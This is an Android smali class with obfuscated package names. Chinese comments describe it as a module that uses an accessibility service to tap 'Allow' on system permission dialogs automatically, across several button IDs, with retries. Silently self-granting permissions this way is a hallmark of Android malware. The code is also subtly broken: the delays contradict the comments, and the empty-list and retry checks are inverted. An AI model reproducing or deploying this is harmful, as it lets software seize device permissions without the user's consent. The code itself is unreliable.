.class public final Lڝږ؁ڋ/ڤ;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# 权限对话框自动点“允许”的独立模块：
#   1) 检测到 GrantPermissionsActivity 时延迟 800ms 再点（等对话框动画结束）
#   2) 依次尝试 allow_all / allow / foreground_only（含 com.android / com.google 两家包名）
#   3) 点完 1.2s 复查：对话框还在就再点，最多 3 轮（三星的一次性授权需要多点几次）

.field private static handler:Landroid/os/Handler;
.field private final svc:Landroid/accessibilityservice/AccessibilityService;
.field private final round:I

.method static constructor <clinit>()V
    .locals 2
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    sput-object v0, Lڝږ؁ڋ/ڤ;->handler:Landroid/os/Handler;
    return-void
.end method

.method public constructor <init>(Landroid/accessibilityservice/AccessibilityService;I)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lڝږ؁ڋ/ڤ;->svc:Landroid/accessibilityservice/AccessibilityService;
    iput p2, p0, Lڝږ؁ڋ/ڤ;->round:I
    return-void
.end method

.method public static start(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 5
    :try_start_0
    sget-object v0, Lڝږ؁ڋ/ڤ;->handler:Landroid/os/Handler;
    if-nez v0, :cond_0
    return-void
    :cond_0
    new-instance v1, Lڝږ؁ڋ/ڤ;
    const/4 v2, 0x0
    invoke-direct {v1, p0, v2}, Lڝږ؁ڋ/ڤ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V
    const-wide/16 v3, 0x7d0
    invoke-virtual {v0, v1, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method public run()V
    .locals 9
    :try_start_0
    iget-object v0, p0, Lڝږ؁ڋ/ڤ;->svc:Landroid/accessibilityservice/AccessibilityService;
    if-nez v0, :cond_0
    return-void
    :cond_0
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v1
    if-nez v1, :cond_1
    return-void
    :cond_1
    const/4 v2, 0x0
    new-array v2, v2, [Ljava/lang/String;
    const/4 v2, 0x6
    new-array v2, v2, [Ljava/lang/String;
    const/4 v3, 0x0
    const-string v4, "com.android.permissioncontroller:id/permission_allow_all_button"
    aput-object v4, v2, v3
    const/4 v3, 0x1
    const-string v4, "com.google.android.permissioncontroller:id/permission_allow_all_button"
    aput-object v4, v2, v3
    const/4 v3, 0x2
    const-string v4, "com.android.permissioncontroller:id/permission_allow_button"
    aput-object v4, v2, v3
    const/4 v3, 0x3
    const-string v4, "com.google.android.permissioncontroller:id/permission_allow_button"
    aput-object v4, v2, v3
    const/4 v3, 0x4
    const-string v4, "com.android.permissioncontroller:id/permission_allow_foreground_only_button"
    aput-object v4, v2, v3
    const/4 v3, 0x5
    const-string v4, "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button"
    aput-object v4, v2, v3
    array-length v3, v2
    const/4 v4, 0x0
    :loop
    if-ge v4, v3, :done
    aget-object v5, v2, v4
    invoke-virtual {v1, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;
    move-result-object v5
    if-eqz v5, :next
    invoke-interface {v5}, Ljava/util/List;->isEmpty()Z
    move-result v6
    if-eqz v6, :next
    const/4 v6, 0x0
    invoke-interface {v5, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;
    move-result-object v5
    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;
    const/16 v6, 0x10
    invoke-virtual {v5, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    move-result v6
    const-string v7, "MyAccessSvc"
    new-instance v8, Ljava/lang/StringBuilder;
    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v5
    invoke-static {v7, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    goto :done
    :next
    add-int/lit8 v4, v4, 0x1
    goto :loop
    :done
    iget v4, p0, Lڝږ؁ڋ/ڤ;->round:I
    const/4 v5, 0x3
    if-lt v4, v5, :ret
    sget-object v5, Lڝږ؁ڋ/ڤ;->handler:Landroid/os/Handler;
    new-instance v6, Lڝږ؁ڋ/ڤ;
    add-int/lit8 v4, v4, 0x1
    invoke-direct {v6, v0, v4}, Lڝږ؁ڋ/ڤ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V
    const-wide/16 v7, 0x7d0
    invoke-virtual {v5, v6, v7, v8}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :ret
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method
